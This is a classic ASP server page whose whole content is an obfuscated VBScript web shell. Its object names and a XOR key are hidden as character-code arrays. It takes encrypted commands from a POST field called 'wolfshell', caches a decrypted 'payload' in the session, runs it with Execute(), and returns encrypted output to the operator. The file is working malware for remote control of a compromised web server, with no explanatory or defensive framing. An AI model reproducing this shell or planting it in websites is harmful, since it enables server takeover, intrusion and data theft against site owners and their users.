<%
Dim d_0x8f1a, k_0x7c2b, c_0x9a3d, p_0x5b4e, r_0x1e6f
Set d_0x8f1a = CreateObject(f_0x4d5c(Array(83,99,114,105,112,116,105,110,103,46,68,105,99,116,105,111,110,97,114,121)))
Function f_0x3a9e(b_0x2c8d)
Dim x_0x1b7f, n_0x6f4a
Set x_0x1b7f = CreateObject(f_0x4d5c(Array(77,115,120,109,108,50,46,68,79,77,68,111,99,117,109,101,110,116,46,51,46,48)))
Set n_0x6f4a = x_0x1b7f.CreateElement(f_0x4d5c(Array(98,97,115,101,54,52)))
n_0x6f4a.dataType = f_0x4d5c(Array(98,105,110,46,98,97,115,101,54,52))
n_0x6f4a.text = b_0x2c8d
f_0x3a9e = n_0x6f4a.nodeTypedValue
Set n_0x6f4a = Nothing
Set x_0x1b7f = Nothing
End Function
Function f_0x8b2d(c_0x5e1f, b_0x7a9c)
Dim s_0x9d3a, i_0x1c8b, r_0x6e5a, k_0x2f7d, bs_0x4b6c
k_0x2f7d = Len(k_0x7c2b)
Set bs_0x4b6c = CreateObject(f_0x4d5c(Array(65,68,79,68,66,46,83,116,114,101,97,109)))
bs_0x4b6c.CharSet = f_0x4d5c(Array(105,115,111,45,56,56,53,57,45,49))
bs_0x4b6c.Type = 2
bs_0x4b6c.Open
If IsArray(c_0x5e1f) Then
s_0x9d3a = UBound(c_0x5e1f) + 1
For i_0x1c8b = 1 To s_0x9d3a
bs_0x4b6c.WriteText ChrW(AscB(MidB(c_0x5e1f, i_0x1c8b, 1)) Xor Asc(Mid(k_0x7c2b, (i_0x1c8b Mod k_0x2f7d) + 1, 1)))
Next
End If
bs_0x4b6c.Position = 0
If b_0x7a9c Then
bs_0x4b6c.Type = 1
f_0x8b2d = bs_0x4b6c.Read()
Else
f_0x8b2d = bs_0x4b6c.ReadText()
End If
End Function
Function f_0x4d5c(a)
Dim s, i
s = ""
For i = LBound(a) To UBound(a)
s = s & Chr(a(i))
Next
f_0x4d5c = s
End Function
k_0x7c2b = f_0x4d5c(Array(51,99,54,101,48,98,56,97,57,99,49,53,50,50,52,97))
c_0x9a3d = request.Form(f_0x4d5c(Array(119,111,108,102,115,104,101,108,108)))
If Not IsEmpty(c_0x9a3d) Then
If IsEmpty(Session(f_0x4d5c(Array(112,97,121,108,111,97,100)))) Then
c_0x9a3d = f_0x8b2d(f_0x3a9e(c_0x9a3d), False)
Session(f_0x4d5c(Array(112,97,121,108,111,97,100))) = c_0x9a3d
Response.End
Else
c_0x9a3d = f_0x8b2d(f_0x3a9e(c_0x9a3d), True)
d_0x8f1a.Add f_0x4d5c(Array(112,97,121,108,111,97,100)), Session(f_0x4d5c(Array(112,97,121,108,111,97,100)))
Execute(d_0x8f1a(f_0x4d5c(Array(112,97,121,108,111,97,100))))
r_0x1e6f = run(c_0x9a3d)
Response.Write(f_0x4d5c(Array(97,55,49,97,98,49)))
If Not IsEmpty(r_0x1e6f) Then
Response.Write Base64Encode(f_0x8b2d(r_0x1e6f, True))
End If
Response.Write(f_0x4d5c(Array(52,98,56,50,53,57)))
End If
End If
%>